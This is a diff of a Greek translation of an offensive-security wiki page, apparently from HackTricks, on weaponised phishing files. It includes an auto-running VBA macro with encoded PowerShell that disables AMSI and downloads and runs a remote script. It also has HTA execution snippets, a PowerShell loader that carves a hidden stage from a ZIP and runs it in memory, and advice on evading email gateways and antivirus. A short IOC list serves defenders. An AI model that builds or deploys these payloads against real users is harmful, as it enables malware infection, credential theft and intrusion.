@@ -1,40 +1,40 @@
-# Phishing Αρχεία & Έγγραφα
+# Phishing Files & Documents
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Έγγραφα
+## Office Documents
 
-Το Microsoft Word εκτελεί έλεγχο εγκυρότητας δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Ο έλεγχος εγκυρότητας δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοιχτεί.
+Microsoft Word εκτελεί έλεγχο εγκυρότητας των δεδομένων αρχείου πριν από το άνοιγμα ενός αρχείου. Ο έλεγχος εγκυρότητας πραγματοποιείται με τη μορφή ταυτοποίησης της δομής των δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την ταυτοποίηση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.
 
-Συνήθως, τα αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατόν να μετονομαστεί το αρχείο αλλάζοντας την επέκταση αρχείου και να διατηρηθεί η ικανότητα εκτέλεσης των macros.\
-Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros από σχεδιασμό, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό για εκτέλεση macros.\
-Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί ισχύουν για όλο το λογισμικό του Microsoft Office Suite (Excel, PowerPoint κ.λπ.).
+Συνήθως, αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την επέκταση και να διατηρηθούν οι δυνατότητές του εκτέλεσης macros.\
+Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, εκ κατασκευής, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό να εκτελεί macros.\
+Τα ίδια εσωτερικά στοιχεία και μηχανισμοί ισχύουν για όλο το λογισμικό του Microsoft Office Suite (Excel, PowerPoint κ.λπ.).
 
-Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα Office:
+Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελεστούν από ορισμένα προγράμματα του Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
 DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
 
-### Φόρτωση εξωτερικής εικόνας
+### Φόρτωση Εξωτερικής Εικόνας
 
-Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
+Πήγαινε σε: _Insert --> Quick Parts --> Field_\
+_**Κατηγορίες**: Links and References, **Ονόματα πεδίων**: includePicture, και **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
-Είναι δυνατό να χρησιμοποιηθούν macros για να εκτελέσουν arbitrary code από το έγγραφο.
+Είναι δυνατό να χρησιμοποιηθούν macros για να τρέξουν αυθαίρετο κώδικα από το έγγραφο.
 
-#### Autoload functions
+#### Συναρτήσεις αυτόματης φόρτωσης
 
-Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι το AV να τις εντοπίσει.
+Όσο πιο κοινές είναι, τόσο πιο πιθανό το AV να τις ανιχνεύσει.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Παραδείγματα Κώδικα Macros
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -64,16 +64,16 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Αφαίρεση μεταδεδομένων χειροκίνητα
+#### Αφαιρέστε χειροκίνητα μεταδεδομένα
 
-Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα ανοίξει το Document Inspector. Κάντε κλικ στο **Inspect** και στη συνέχεια **Remove All** δίπλα στο **Document Properties and Personal Information**.
+Πηγαίνετε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα εμφανίσει το Document Inspector. Κάντε κλικ στο **Inspect** και μετά στο **Remove All** δίπλα στο **Document Properties and Personal Information**.
 
-#### Επέκταση αρχείου
+#### Προέκταση αρχείου
 
-Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
-Κάντε αυτό επειδή **δεν μπορείτε να αποθηκεύσετε macro's μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** γύρω από την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες web/email gateway το μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιού τύπου επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.
+When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
+Κάντε αυτό γιατί **δεν μπορείτε να αποθηκεύσετε macros μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** γύρω από την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα μεγάλο `!` και ορισμένες web/email πύλες τα μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.
 
-#### Δημιουργοί Κακόβουλων Macros
+#### Malicious Macros Generators
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ proc.Create "powershell <beacon line generated>
 
 ## Αρχεία HTA
 
-Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το user interface και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός browser.
+Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως εφαρμογή "fully trusted", χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός browser.
 
-Ένα HTA εκτελείται με χρήση του **`mshta.exe`**, το οποίο συνήθως είναι εγκατεστημένο μαζί με τον **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από τον IE**. Οπότε, εάν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
+Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως εγκαθίσταται μαζί με τον **Internet Explorer**, καθιστώντας **`mshta` εξαρτημένο από τον IE**. Έτσι, αν αυτός έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +138,11 @@ var_func
 self.close
 </script>
 ```
-## Εξαναγκασμός αυθεντικοποίησης NTLM
+## Εξαναγκασμός NTLM Authentication
 
-Υπάρχουν διάφοροι τρόποι για να **εξαναγκάσετε την αυθεντικοποίηση NTLM "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα προσπελάσει (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσει** μια **αυθεντικοποίηση** απλά με το **άνοιγμα του φακέλου.**
+Υπάρχουν αρκετοί τρόποι να **force NTLM authentication "remotely"**, για παράδειγμα, μπορείτε να προσθέσετε **invisible images** σε emails ή HTML που θα ανοίξει ο χρήστης (ακόμα και HTTP MitM?). Ή να στείλετε στο θύμα τη **address of files** που θα **trigger** μια **authentication** απλά με το **opening the folder.**
 
-**Δείτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**
+**Ελέγξτε αυτές τις ιδέες και περισσότερα στις ακόλουθες σελίδες:**
 
 
 {{#ref}}
@@ -156,24 +156,24 @@ self.close
 
 ### NTLM Relay
 
-Μην ξεχνάτε ότι μπορείτε όχι μόνο να κλέψετε το hash ή την αυθεντικοποίηση αλλά και να **εκτελέσετε NTLM relay attacks**:
+Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την authentication αλλά και να **perform NTLM relay attacks**:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Πολύ αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα δολώματα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk το εξάγει και το τρέχει ολοκληρωτικά στη μνήμη.
+Πολύ αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα decoy documents (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk το carve-άρει και το τρέχει πλήρως στη μνήμη.
 
 Τυπική ροή που υλοποιείται από το .lnk PowerShell one-liner:
 
-1) Εντοπίστε το αρχικό ZIP σε συνήθεις διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και τον γονικό φάκελο του τρέχοντος working directory.
-2) Read the ZIP bytes and find a hardcoded marker (e.g., xFIQCV). Everything after the marker is the embedded PowerShell payload.
-3) Αντιγράψτε το ZIP σε %ProgramData%, αποσυμπιέστε το εκεί και ανοίξτε το δολωμένο .docx ώστε να φαίνεται νόμιμο.
-4) Παρακάμψτε το AMSI για τη τρέχουσα διαδικασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Καθαρίστε (deobfuscate) το επόμενο στάδιο (π.χ., αφαιρέστε όλους τους χαρακτήρες '#') και εκτελέστε το στη μνήμη.
+1) Εντοπίζει το αρχικό ZIP σε κοινές διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και τον parent του current working directory.  
+2) Διαβάζει τα bytes του ZIP και βρίσκει έναν hardcoded marker (π.χ., xFIQCV). Ό,τι βρίσκεται μετά το marker είναι το embedded PowerShell payload.  
+3) Αντιγράφει το ZIP σε %ProgramData%, το εξάγει εκεί, και ανοίγει το decoy .docx για να φαίνεται νόμιμο.  
+4) Παρακάμπτει το AMSI για τη τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
+5) Deobfuscate το επόμενο στάδιο (π.χ., αφαιρεί όλους τους χαρακτήρες #) και το εκτελεί στη μνήμη.
 
-Παράδειγμα PowerShell skeleton για να carve και να τρέξει το embedded stage:
+Example PowerShell skeleton to carve and run the embedded stage:
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -191,25 +191,25 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Σημειώσεις
-- Η παράδοση συχνά καταχράται αξιόπιστους υποτομείς PaaS (π.χ., *.herokuapp.com) και μπορεί να φιλτράρει τα payloads (σερβίροντας benign ZIPs με βάση IP/UA).
-- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα ίχνη στο δίσκο.
+- Η παράδοση συχνά καταχράται αξιόπιστα PaaS subdomains (π.χ., *.herokuapp.com) και μπορεί να gate-άρει τα payloads (σερβίροντας benign ZIPs με βάση IP/UA).
+- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα disk artifacts.
 
-Persistence που χρησιμοποιείται στην ίδια αλυσίδα
-- COM TypeLib hijacking του Microsoft Web Browser control έτσι ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινεί το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:
+Persistence used in the same chain
+- COM TypeLib hijacking του Microsoft Web Browser control ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινήσει το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Κυνηγητό/IOCs
-- ZIP αρχεία που περιέχουν το ASCII marker string (π.χ., xFIQCV) προσαρτημένο στα δεδομένα του αρχείου.
-- .lnk που απαριθμεί φακέλους γονέα/χρήστη για να εντοπίσει το ZIP και ανοίγει ένα ψεύτικο έγγραφο.
-- Παραποίηση AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Μακροχρόνια business threads που καταλήγουν σε links φιλοξενούμενα σε αξιόπιστους PaaS domains.
+Hunting/IOCs
+- ZIP files που περιέχουν το ASCII marker string (π.χ., xFIQCV) προστιθέμενο στα δεδομένα του archive.
+- .lnk που απαριθμεί φακέλους parent/user για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
+- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Μακροχρόνια business threads που καταλήγουν σε links hosted under trusted PaaS domains.
 
 ## Windows αρχεία για κλοπή NTLM hashes
 
-Δείτε τη σελίδα για **places to steal NTLM creds**:
+Δείτε τη σελίδα για **μέρη για κλοπή NTLM creds**:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
